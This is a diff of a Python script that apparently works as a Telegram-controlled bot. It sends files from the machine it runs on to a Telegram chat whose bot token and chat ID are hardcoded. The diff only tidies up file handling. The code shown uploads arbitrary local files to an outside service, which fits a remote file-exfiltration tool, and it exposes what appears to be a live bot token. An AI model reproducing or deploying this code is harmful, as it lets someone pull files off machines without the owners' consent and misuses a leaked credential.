@@ -2,7 +2,6 @@ import os
 import requests
 import json
 import subprocess
-import threading
 
 # Replace with your bot token and chat ID
 TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
@@ -30,8 +29,9 @@ def send_to_telegram(message, document=None):
     try:
         if document:
             url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
-            files = {'document': open(document, 'rb')}
-            response = requests.post(url, files=files, data={"chat_id": CHAT_ID})
+            with open(document, 'rb') as f:
+                files = {'document': f}
+                response = requests.post(url, files=files, data={"chat_id": CHAT_ID})
         else:
             response = requests.post(url, data=data)
         
@@ -60,9 +60,10 @@ def download_file(file_name):
         
         if os.path.isfile(file_path):
             url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
-            files = {'document': open(file_path, 'rb')}
-            data = {"chat_id": CHAT_ID}
-            response = requests.post(url, files=files, data=data)
+            with open(file_path, 'rb') as f:
+                files = {'document': f}
+                data = {"chat_id": CHAT_ID}
+                response = requests.post(url, files=files, data=data)
             
             if response.status_code == 200:
                 return f"File `{file_name}` sent successfully!"
